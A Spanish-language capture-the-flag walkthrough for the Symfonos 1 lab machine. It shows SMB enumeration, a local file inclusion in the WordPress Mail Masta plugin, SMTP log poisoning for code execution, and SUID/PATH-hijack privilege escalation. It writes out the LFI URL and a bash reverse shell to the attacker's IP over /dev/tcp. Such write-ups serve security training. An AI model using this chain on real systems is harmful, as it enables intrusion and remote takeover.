# Symfonos: 1

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: SMB Enumeration /
Information Leakage /
WordPress Enumeration /
Abusing WordPress Plugin - Mail Masta 1.0 /
Local File Inclusion (LFI) /
Bash Scripting - Creating our own file reader utility /
LFI + Abusing SMTP service to achieve RCE /
Abusing SUID privilege + PATH Hijacking [Privilege Escalation]

Te prepara para las **Certificaciones**: eWPT /
eJPT /
eCPPTv2 /
eCPTXv2<br><br>

![image](https://github.com/user-attachments/assets/5e9743da-2921-40e0-aa17-80efcbce5d2f)<br><br>


Utilizando `arp-scan` vemos la IP de la maquina.<br>

![image](https://github.com/user-attachments/assets/6f278575-61a0-4d41-955e-905d9e58ca04)<br>

- `-I eth0` -> Mi interfaz grafica.
- `--localnet` -> Red local.
- `--ignoredups` -> Que ignore duplicados.<br><br>

Utilizando `nmap` escaneamos los puertos mas comunes<br>

![image](https://github.com/user-attachments/assets/dc76b7e3-8b8d-44ad-8e81-c6c1afdfc7a3)<br>

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>

Utilizando `nmap` lanzamos los scrips mas comunes de reconocimiento a los puertos abiertos.<br>

![image](https://github.com/user-attachments/assets/5410be42-a275-4eec-8584-e7ceaa210763)<br><br>

- En `/etc/hosts` Ponemos el dominio con la ip `192.168.0.86 symfonos.localdomain`<br><br>

### SMB

Utilizando `smbmap` vemos los recursos compartidos, vemos un usuario "helios" y una carpeta "anonymous" con capacidad de lectura.<br>

![image](https://github.com/user-attachments/assets/cf78d42d-7657-4f36-8d98-ce5de4f31c5b)<br><br>


Nos traemos el recurso "attention.txt" a nuestro equipo y encontramos contraseñas.<br>

![image](https://github.com/user-attachments/assets/81a42565-4c20-48e0-ae9e-b0ebba130ce6)<br><br>


Con el usuario y la contraseña podemos acceder a la carpeta "helios" y descargamos "todo.txt" junto con "research.txt"<br>

![image](https://github.com/user-attachments/assets/90bc213f-be93-411b-bf49-dc493aee138f)<br><br>


Encontramos un directorio Wordpress.<br>

![image](https://github.com/user-attachments/assets/0fe94f90-9570-4a2c-b20f-5331533c5e68)<br><br>

## WordPress LFI

Encontramos plugins:<br>

![image](https://github.com/user-attachments/assets/d233de98-508e-4ae6-850e-87e31561c506)<br><br>


- Url explotación de "mail-masta": https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44/<br>

- http://192.168.0.86/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd -> LFI<br>

## Log Poisoning

Nos conectamos al smtp por el puerto 25 "nc 192.168.0.86 25":<br><br>

```
MAIL FROM: santiago@santiago.com

RCPT TO: helios

DATA

<?CODIGO PHP?>

.

```
<br><br>

Buscamos la data que mandamos:<br>

http://192.168.0.86/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id <br><br>

Ganamos acceso:<br>

- http://192.168.0.86/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.30/443 0>%261"<br>

- rlwrap nc -nlvp 443 -> Nos ponemos en escucha.<br><br>

## Escalada de privilegios

Encontramos un binario SUID que ejecuta un `curl`<br>

![image](https://github.com/user-attachments/assets/dac0c31b-3eab-4456-b4f2-90cd0830c3fa)<br><br>

En `tmp` creamos un archivo que ponga SUID en la bash.<br>

![image](https://github.com/user-attachments/assets/3799e571-dd5b-4020-85b8-e08b603d59d6)<br><br>


Ponemos como prioridad la ruta `tmp`<br>

![image](https://github.com/user-attachments/assets/70c8bcb0-ae67-4d0e-956a-5b07a2db0d34)<br><br>

Ejecutamos el binario, nos lanzamos una bash privilegiada y somos root. Flag final:<br>

![image](https://github.com/user-attachments/assets/fd0d9083-0f81-4178-b363-f5e880b27e65)<br><br>


